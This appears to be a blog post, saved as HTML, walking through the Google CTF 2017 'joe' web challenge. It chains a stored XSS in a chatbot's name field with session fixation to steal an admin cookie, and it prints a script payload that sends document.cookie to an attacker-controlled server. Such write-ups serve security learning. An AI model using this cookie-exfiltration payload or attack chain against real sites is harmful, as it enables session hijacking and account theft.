@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="de-de">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="Don&#39;t panic">
+
+<base href="http://robinverton.de/">
+<title>
+
+
+     Google CTF 2017, joe, web 
+
+</title>
+<link rel="canonical" href="http://robinverton.de/ctf/googlectf-2017-joe-web/">
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/styles/default.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Raleway:500">
+
+
+
+    
+    <link rel="stylesheet" href="http://robinverton.de/css/reset.css?t=1497872078">
+    <link rel="stylesheet" href="http://robinverton.de/css/pygments.css?t=1497872078">
+    <link rel="stylesheet" href="http://robinverton.de/css/main.css?t=1497872078">
+    
+        <link rel="stylesheet" href="http://robinverton.de/css/override.css?t=1497872078">
+    
+
+
+
+
+<link rel="shortcut icon"
+
+    href="http://robinverton.de/img/leaf.ico"
+
+>
+
+
+
+
+
+
+</head>
+
+
+<body lang="en">
+
+<section class="header">
+    <div class="container">
+        <div class="content">
+            
+            <a href="http://robinverton.de/"><div class="name">Robin Verton</div></a>
+            
+            <nav>
+                <ul>
+                    <li class="nav-blog"><a href="http://robinverton.de/blog/">Blog</a></li>
+                    
+                    <li class="nav-code"><a href="http://robinverton.de/stuff/">Stuff</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+<section class="icons">
+    <div class="container">
+        <div class="content">
+
+        
+            <a href="//github.com/rverton" target="_blank" rel="noopener"><img class="icon" src="http://robinverton.de/img/github.svg" alt="github" /></a>
+        
+
+        
+            <a href="//twitter.com/robinverton" target="_blank" rel="noopener"><img class="icon" src="http://robinverton.de/img/twitter.svg" alt="twitter" /></a>
+        
+
+        
+
+        
+
+        
+
+        
+            <a href="mailto:hello@robinverton.de"><img class="icon" src="http://robinverton.de/img/email.svg" alt="email" /></a>
+        
+
+        
+            <a href="http://robinverton.de/index.xml"><img class="icon" src="http://robinverton.de/img/rss.svg" alt="rss" /></a>
+        
+        </div>
+    </div>
+</section>
+
+<section class="main">
+    <div class="container">
+        <div class="content">
+            <div class="page-heading">
+
+    Google CTF 2017, joe, web
+
+</div>
+
+            <div class="markdown">
+                
+
+<h2 id="joe-your-intelligent-converation-partner">Joe, your intelligent converation partner</h2>
+
+<p>For the Joe challenge, you got access to a simple page which looked like a chat. Over a text box you were able to talk with Joe, an &ldquo;intelligent&rdquo; converation partner/bot.</p>
+
+<p>Joe had a few functionalities:</p>
+
+<ul>
+<li>Print out Joe&rsquo;s name</li>
+<li>Set a new name</li>
+<li>Some small talk stuff</li>
+<li>Report a bug to an admin</li>
+</ul>
+
+<p><img src="http://robinverton.de/static/ctf/googlectf-2017-joe-1.png" alt="" /></p>
+
+<p>The challenge description already told us to steal the admin cookie, so the last functionality (report a bug) was a good guess how we can interact with the admin.</p>
+
+<p>After inspecting the source, I was not able to find any direct vulnerabilities. Sending a message was - on the first sight - not vulnerable to XSS, because the message was inserted as a text element:</p>
+
+<pre><code>var row = document.createElement('p');
+row.className = peer;
+row.textContent = message;
+conversation.appendChild(row);
+</code></pre>
+
+<h2 id="persistent-cross-site-scripting-vulnerability">Persistent Cross-Site Scripting Vulnerability</h2>
+
+<p>I played a bit with this and changed the name of Joe to some XSS payload (<code>&lt;img src=x&gt;</code>). Because of the code above, this payload was not executed. After testing a few other things and refreshing the page, I noticed that this payload was now executed. It was present on the page (like a log):</p>
+
+<p><img src="http://robinverton.de/static/ctf/googlectf-2017-joe-4.png" alt="" /></p>
+
+<p>So we have a persistent xss in our own session. How can this help us?</p>
+
+<p>My next focus was on the <code>/message?msg=foo</code> endpoint. It was the endpoint called when sending a message. The nice part about this endpoint was the last header of the response:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-cache
+Content-Encoding: gzip
+X-Cloud-Trace-Context: 805d41a72f2623ac1728fed38fcac495;o=1
+Vary: Accept-Encoding
+Date: Mon, 19 Jun 2017 10:45:42 GMT
+Server: Google Frontend
+Content-Length: 64
+Content-Type: `text/html`
+</code></pre>
+
+<p>The response also did not encode the response, so this looks like a perfect way to execute javascript in the context of a different user, doesn&rsquo;t it?</p>
+
+<p>So my idea was like this: Report a bug to this endpoint, where <em>msg</em> contains my actual payload to steal the cookie. Sadly this was not possible, because there was a very simple check against CSRF. To submit a message (and get a response), you had to add a <code>CSRF-Protection: 1</code> header. This is not possible with a <code>XMLHttpRequest</code>/<code>fetch</code>, because making a GET request with an additional header results in a &ldquo;preflight&rdquo;-request (<code>OPTIONS</code>), to check for CORS settings. <code>OPTIONS</code> was not allowed on the server, so this failed. You can read more about this concept <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS">here</a>.</p>
+
+<h2 id="join-me">Join me</h2>
+
+<p>So I kept searching for a way to get the admin to join my session. After taking a deeper look at the requests which were made for logging me in, I found this request to fullfill my login:</p>
+
+<p><img src="http://robinverton.de/static/ctf/googlectf-2017-joe-2.png" alt="" /></p>
+
+<p>As can be seen, the <code>/login</code> endpoint is called and a long token is passed. Maybe this allows to fixate a session?</p>
+
+<blockquote>
+<p>A session fixation allows to make a &ldquo;victim&rdquo; use a session an attacker has control over. Read more <a href="https://www.owasp.org/index.php/Session_fixation">here</a>.</p>
+</blockquote>
+
+<p>So if I can make the admin reuse my session, he will also execute the XSS payload I inserted before as the name (described above). Let&rsquo;s test it by copying this exact login url from burp and pasting it into a private browser window:</p>
+
+<p><img src="http://robinverton.de/static/ctf/googlectf-2017-joe-3.png" alt="" /></p>
+
+<p>Success! We executed javascript in the context of a different user. So lets recap what steps we need:</p>
+
+<ul>
+<li>Prepare our session with some XSS payload as the name</li>
+<li>Send the admin to a link which logs him into our session. This will the also redirect him to the &ldquo;start&rdquo; page and execute our payload.</li>
+<li>Our payloads needs to take the cookie and sent it to our server.</li>
+</ul>
+
+<p>I then used a simple payload as Joe&rsquo;s new name (<code>let me rename you</code>) to send the cookie as a parameter to my server:</p>
+
+<pre><code>&lt;script&gt;document.write('&lt;img src=&quot;http://myserver.com?cookie?' + document.cookie);&lt;/script&gt;
+</code></pre>
+
+<p>This appends the current cookie to an url. The image does not exist, but the browser will try to fetch this image anyway so I can see it in my server access logs. Lets report our bug, so the admin visits our prepared page:</p>
+
+<p><img src="http://robinverton.de/static/ctf/googlectf-2017-joe-5.png" alt="" /></p>
+
+<p>As you can see here, I can&rsquo;t redirect the admin directly to the <code>/login?toke=...</code> url because it was too long. Do work around this I made a simple html file on my server and included this url in an iframe:</p>
+
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;iframe src=&quot;https://joe.web.ctfcompetition.com/login?id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImEyOThhNTZiNmFjMDU0MzEyNTNkNDkwMzA4MTZhNWViZjk5YTEzYzUifQ.eyJhenAiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5[...]&quot;&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+
+<p>And here we see our &ldquo;exploit&rdquo; worked, we got the flag :)</p>
+
+<p><img src="http://robinverton.de/static/ctf/googlectf-2017-joe-6.png" alt="" /></p>
+
+            </div>
+        </div>
+    </div>
+</section>
+
+
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
+  
+
+  <script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+  </script>
+
+
+
+</body>
+</html>
+
